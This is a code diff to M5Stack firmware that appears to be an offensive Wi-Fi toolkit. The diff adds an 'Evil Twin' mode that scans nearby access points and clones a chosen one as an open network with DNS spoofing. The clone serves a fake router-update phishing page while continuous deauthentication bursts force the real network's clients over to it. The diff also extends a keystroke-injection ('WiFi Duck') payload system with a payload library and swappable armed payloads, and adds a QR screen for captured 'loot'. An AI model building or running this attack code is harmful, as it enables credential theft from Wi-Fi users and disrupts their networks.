-    if (laughOn) playLaugh();                 // evil laugh on every new capture (async)
+    if (laughOn || twinActive) playLaugh();   // evil laugh on every capture (always in twin mode)
     else if (soundOn) M5.Speaker.tone(4000, 60);
     if (ledBlinkOn) startBlink();  // non-blocking; loop() redraws the dashboard
   });
@@ -1725,6 +2076,19 @@ void registerRoutes() {
     if (!requireAuth()) return;
     sendDuckList();
   });
+  webServer.on("/duck/library", []() {        // built-in payload catalog
+    if (!requireAuth()) return;
+    sendDuckLibrary();
+  });
+  webServer.on("/duck/export", []() {         // download all saved payloads as a bundle
+    if (!requireAuth()) return;
+    sendDuckExport();
+  });
+  webServer.on("/duck/import", HTTP_POST, []() {  // restore payloads from a bundle
+    if (!requireAuth()) return;
+    int c = duckImportBundle(webServer.arg("bundle"));
+    webServer.send(HTTP_CODE, "application/json", String("{\"ok\":true,\"count\":") + c + "}");
+  });
   webServer.on("/duck/status", []() {
     if (!requireAuth()) return;
     webServer.send(HTTP_CODE, "application/json",
@@ -1742,6 +2106,8 @@ void registerRoutes() {
     if (activeProject == PROJ_DUCK) {
       if (!requireAuth()) return;
       webServer.send(HTTP_CODE, "text/html", duckPanel());
+    } else if (twinActive) {
+      webServer.send(HTTP_CODE, "text/html", twinIndex());  // router-update Wi-Fi phish
     } else {
       webServer.send(HTTP_CODE, "text/html", index());
     }
@@ -1760,6 +2126,7 @@ void startPortal() {
   portalStarted = true;
 
   appState = ST_RUNNING;
+  showQR = false;
   drawMainScreen();
   previous = capcount;  // avoid an immediate redraw on the first loop tick
   dotOn = true;
@@ -1775,15 +2142,164 @@ void stopPortal() {
     WiFi.mode(WIFI_OFF);
     portalStarted = false;
   }
+  twinActive = false;   // leaving the portal also ends any evil-twin deauth
+  showQR = false;
   blinkRemaining = 0;
   ledWrite(false);  // LED off (no-op when LED_PIN < 0)
+}
+
+// -------- Evil Twin: scan, pick a target, clone + deauth --------
+
+// Scan 2.4GHz for nearby APs and keep up to MAX_SCAN cloneable (named) ones.
+void scanNetworks() {
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false);
+  delay(80);
+  int n = WiFi.scanNetworks(false, true);   // blocking, include hidden
+  scanCount = 0;
+  for (int i = 0; i < n && scanCount < MAX_SCAN; i++) {
+    String s = WiFi.SSID(i);
+    if (s.length() == 0) continue;           // can't clone a hidden / blank SSID
+    scanSsid[scanCount] = s;
+    uint8_t *b = WiFi.BSSID(i);
+    if (b) memcpy(scanBssid[scanCount], b, 6);
+    scanCh[scanCount]   = (uint8_t)WiFi.channel(i);
+    scanRssi[scanCount] = (int8_t)WiFi.RSSI(i);
+    scanEnc[scanCount]  = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
+    scanCount++;
+  }
+  WiFi.scanDelete();
+}
+
+#define SCAN_VIS 5   // network rows visible at once (the list scrolls)
+
+// Render the target-picker list (networks + Rescan + Back).
+void drawScanMenu() {
+  fillBgBand(0, 135);
+  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
+  M5.Lcd.drawFastHLine(0, 26, 240, C_CARD_SH);
+  M5.Lcd.setTextDatum(ML_DATUM);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE);
+  M5.Lcd.drawString("SELECT TARGET", 8, 13);
+  drawBatteryAt(206, 6, TFT_WHITE, C_HDR_TOP);
+
+  int total = scanCount + 2;                  // + Rescan + Back
+  if (scanSel < scanTop)             scanTop = scanSel;
+  if (scanSel >= scanTop + SCAN_VIS) scanTop = scanSel - SCAN_VIS + 1;
+
+  if (scanCount == 0) {
+    M5.Lcd.setTextSize(1);
+    M5.Lcd.setTextColor(C_MUTED, C_BG);
+    M5.Lcd.setTextDatum(ML_DATUM);
+    M5.Lcd.drawString("No networks found.", 12, 34);
+  }
+
+  const int y0 = 30, rowH = 19;
+  for (int r = 0; r < SCAN_VIS; r++) {
+    int idx = scanTop + r;
+    if (idx >= total) break;
+    int y  = y0 + r * rowH;
+    int yc = y + 8;
+    bool sel = (idx == scanSel);
+    uint16_t body = sel ? C_ACCENT : C_CARD;
+    uint16_t fg   = sel ? TFT_WHITE : C_MUTED;
+    M5.Lcd.fillRoundRect(6, y, 228, rowH - 3, 4, body);
+    if (sel) M5.Lcd.drawRoundRect(6, y, 228, rowH - 3, 4, C_ACC_HI);
+    M5.Lcd.setTextSize(1);
+    if (idx < scanCount) {
+      String s = scanSsid[idx];
+      if (s.length() > 15) s = s.substring(0, 14) + "~";
+      M5.Lcd.setTextDatum(ML_DATUM);
+      M5.Lcd.setTextColor(fg, body);
+      M5.Lcd.drawString(s, 12, yc);
+      String meta = String("ch") + (int)scanCh[idx] + " " + (int)scanRssi[idx] + (scanEnc[idx] ? " #" : " o");
+      M5.Lcd.setTextDatum(MR_DATUM);
+      M5.Lcd.setTextColor(sel ? TFT_WHITE : C_MUTED, body);
+      M5.Lcd.drawString(meta, 228, yc);
+    } else {
+      M5.Lcd.setTextDatum(ML_DATUM);
+      M5.Lcd.setTextColor(fg, body);
+      M5.Lcd.drawString(idx == scanCount ? "Rescan" : "Back", 12, yc);
+    }
+  }
+
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(C_MUTED);
+  M5.Lcd.setTextDatum(BL_DATUM);
+  M5.Lcd.drawString("B:move  A:select", 6, 134);
+  M5.Lcd.setTextDatum(BR_DATUM);
+  M5.Lcd.drawString(String(scanSel + 1) + "/" + String(total), 234, 134);
+  drawBloodFrame();
+}
+
+// Show a brief "scanning" splash, run the scan, then show the picker.
+void runScan() {
+  fillBgBand(0, 135);
+  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
+  M5.Lcd.setTextDatum(ML_DATUM);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.setTextColor(TFT_WHITE);
+  M5.Lcd.drawString("SELECT TARGET", 8, 13);
+  M5.Lcd.setTextDatum(MC_DATUM);
+  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
+  M5.Lcd.drawString("Scanning Wi-Fi...", 120, 74);
+  drawBloodFrame();
+  scanNetworks();
+  scanSel = 0; scanTop = 0;
+  drawScanMenu();
+}
+
+// Enter the Evil Twin target picker.
+void enterScan() {
+  appState = ST_MENU_SCAN;
+  runScan();
+}
+
+// Clone the chosen AP (open, same SSID + channel) and start deauthing it.
+void startTwin(int idx) {
+  twinSSID = scanSsid[idx];
+  memcpy(twinBSSID, scanBssid[idx], 6);
+  twinChannel = scanCh[idx] ? scanCh[idx] : 1;
+  twinDeauthCount = 0;
+  twinActive = true;
+
+  activeProject = PROJ_PORTAL;
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(twinSSID.c_str(), NULL, twinChannel);   // open clone on the target channel
+  dnsServer.start(DNS_PORT, "*", APIP);               // DNS spoofing (HTTP only)
+  webServer.begin();
+  portalStarted = true;
+
+  appState = ST_RUNNING;
+  showQR = false;
+  drawMainScreen();
+  previous = capcount;   // avoid an immediate redraw on the first loop tick
+  dotOn = true;
+  lastTick = millis();
+  lastDeauth = millis();
+}
+
+// Buttons for the target picker (BtnB scrolls, BtnA selects).
+void handleScanButtons() {
+  int total = scanCount + 2;
+  if (M5.BtnB.wasPressed()) {
+    scanSel = (scanSel + 1) % total;
+    drawScanMenu();
+  }
+  if (M5.BtnA.wasPressed()) {
+    if (scanSel < scanCount)       { startTwin(scanSel); }        // -> ST_RUNNING (twin)
+    else if (scanSel == scanCount) { runScan(); }                 // Rescan
+    else { WiFi.mode(WIFI_OFF); appState = ST_MENU_PORTAL; menuSel = 1; drawMenu(true); }
+  }
 }
 
 // -------- Menu rendering + navigation --------
 
 // Small vector glyphs drawn to the left of each menu row. (cx,cy) is the icon
 // centre; `bg` is the row background, used for cut-outs.
-enum { IC_TOOLS, IC_CONFIG, IC_POWER, IC_PLAY, IC_INFO, IC_TRASH, IC_TOGGLE, IC_BRIGHT, IC_FLIP, IC_BACK, IC_DUCK };
+enum { IC_TOOLS, IC_CONFIG, IC_POWER, IC_PLAY, IC_INFO, IC_TRASH, IC_TOGGLE, IC_BRIGHT, IC_FLIP, IC_BACK, IC_DUCK, IC_TWIN };
 void drawMenuIcon(int t, int cx, int cy, uint16_t col, uint16_t bg) {
   switch (t) {
     case IC_TOOLS:                                       // sliders
@@ -1835,6 +2351,12 @@ void drawMenuIcon(int t, int cx, int cy, uint16_t col, uint16_t bg) {
       M5.Lcd.drawPixel(cx - 4, cy - 1, col); M5.Lcd.drawPixel(cx - 1, cy - 1, col);
       M5.Lcd.drawPixel(cx + 2, cy - 1, col); M5.Lcd.drawPixel(cx + 4, cy - 1, col);
       M5.Lcd.drawFastHLine(cx - 4, cy + 2, 8, col);      // space bar
+      break;
+    case IC_TWIN:                                       // broadcast arcs (evil twin)
+      M5.Lcd.fillCircle(cx - 3, cy + 4, 2, col);
+      M5.Lcd.drawCircle(cx - 3, cy + 4, 5, col);
+      M5.Lcd.drawCircle(cx - 3, cy + 4, 8, col);
+      M5.Lcd.fillRect(cx - 3, cy + 4, 12, 7, bg);        // mask the lower-right quadrant
       break;
   }
 }
@@ -1902,7 +2424,7 @@ void toastMsg(const char* msg) {
 
 int currentMenuCount() {
   if (appState == ST_MENU_MAIN)   return 4;  // Evil Portal / WiFi Duck / Config / Exit
-  if (appState == ST_MENU_PORTAL) return 4;  // Start / Info / Reset / Back
+  if (appState == ST_MENU_PORTAL) return 5;  // Start / Evil Twin / Info / Reset / Back
   if (appState == ST_MENU_DUCK)   return 3;  // Start Duck / Info / Back
   return 5;                                  // Beep / LED / Brightness / Flip / Back
 }
@@ -1920,8 +2442,8 @@ void menuItem(int i, String &label, int &icon) {
     const int   I[] = {IC_TOOLS, IC_DUCK, IC_CONFIG, IC_POWER};
     label = L[i]; icon = I[i];
   } else if (appState == ST_MENU_PORTAL) {
-    const char* L[] = {"Start Portal", "Device Info", "Reset Captures", "Back"};
-    const int   I[] = {IC_PLAY, IC_INFO, IC_TRASH, IC_BACK};
+    const char* L[] = {"Start Portal", "Evil Twin", "Device Info", "Reset Captures", "Back"};
+    const int   I[] = {IC_PLAY, IC_TWIN, IC_INFO, IC_TRASH, IC_BACK};
     label = L[i]; icon = I[i];
   } else if (appState == ST_MENU_DUCK) {
     const char* L[] = {"Start Duck", "Device Info", "Back"};
@@ -2125,7 +2647,7 @@ void resetCaptures() {
   previous = -1;        // force the dashboard to repaint if the portal is running
   toastMsg("Captures cleared");
   appState = ST_MENU_PORTAL;
-  menuSel = 2;
+  menuSel = 3;            // "Reset Captures" row index in the Evil Portal menu
   drawMenu(true);
 }
 
@@ -2147,9 +2669,10 @@ void selectCurrent() {
     else if (menuSel == 2) { appState = ST_MENU_CONFIG; menuSel = 0; drawMenu(true); }
     else                   { doExit(); }
   } else if (appState == ST_MENU_PORTAL) {
-    if (menuSel == 0)      { startPortal(); }           // -> ST_RUNNING
-    else if (menuSel == 1) { infoReturn = ST_MENU_PORTAL; infoReturnSel = 1; showDeviceInfo(); }
-    else if (menuSel == 2) { resetCaptures(); }
+    if (menuSel == 0)      { startPortal(); }           // -> ST_RUNNING (plain open AP)
+    else if (menuSel == 1) { enterScan(); }             // Evil Twin -> scan + pick target
+    else if (menuSel == 2) { infoReturn = ST_MENU_PORTAL; infoReturnSel = 2; showDeviceInfo(); }
+    else if (menuSel == 3) { resetCaptures(); }
     else                   { appState = ST_MENU_MAIN; menuSel = 0; drawMenu(true); }
   } else if (appState == ST_MENU_DUCK) {
     if (menuSel == 0)      { startDuck(); }             // -> ST_DUCK_RUNNING
@@ -2166,6 +2689,7 @@ void selectCurrent() {
 
 // BtnB scrolls the selection (animated), BtnA activates it.
 void handleMenuButtons() {
+  if (appState == ST_MENU_SCAN) { handleScanButtons(); return; }  // Evil Twin target picker
   if (M5.BtnB.wasPressed()) {
     int oldSel = menuSel;
     menuSel = (menuSel + 1) % currentMenuCount();
@@ -2233,7 +2757,20 @@ void loop() {
       return;
     }
 
-    if ((millis() - lastTick) > TICK_TIMER) {
+    // BtnA (front button) opens the loot QR, then cycles its pages, then closes.
+    if (M5.BtnA.wasPressed()) {
+      if (!showQR) { showQR = true; qrPage = 0; drawQRScreen(qrPage); }
+      else if (qrPage + 1 < QR_PAGES) { qrPage++; drawQRScreen(qrPage); }
+      else { showQR = false; previous = -1; drawMainScreen(); }   // back to dashboard
+    }
+
+    // Evil Twin: keep hammering the real AP so its clients roam to our clone.
+    if (twinActive && (millis() - lastDeauth) >= 80) {
+      lastDeauth = millis();
+      sendDeauthBurst();
+    }
+
+    if (!showQR && (millis() - lastTick) > TICK_TIMER) {   // QR screen stays put
       lastTick = millis();
       if (capcount != previous) {
         previous = capcount;
@@ -2247,7 +2784,7 @@ void loop() {
       }
     }
     updateBlink();
-    dnsServer.processNextRequest();
+    dnsServer.processNextRequest();   // keep serving so the scanned link loads
     webServer.handleClient();
     return;
   }
@@ -2261,9 +2798,16 @@ void loop() {
       drawMenu(true);
       return;
     }
-    // BtnA: physical trigger -- run the saved default payload.
+    // BtnB tap (short press) cycles the armed payload slot (Bash Bunny-style).
+    // A long hold still stops the Duck (handled above, before release).
+    if (M5.BtnB.wasPressed() && duckSlotCount > 0) {
+      duckArmedSlot = (duckArmedSlot + 1) % duckSlotCount;
+      drawDuckScreenStatus();
+    }
+    // BtnA: physical trigger -- fire the currently armed payload.
     if (M5.BtnA.wasPressed() && !duckBusy) {
-      String s = duckReadFile(DUCK_DEFAULT);
+      String name = (duckSlotCount > 0) ? duckSlotName[duckArmedSlot] : String("payload");
+      String s = duckReadFile(duckPathFor(name));
       if (s.length()) { duckStartScript(s); drawDuckScreenStatus(); }
     }
 
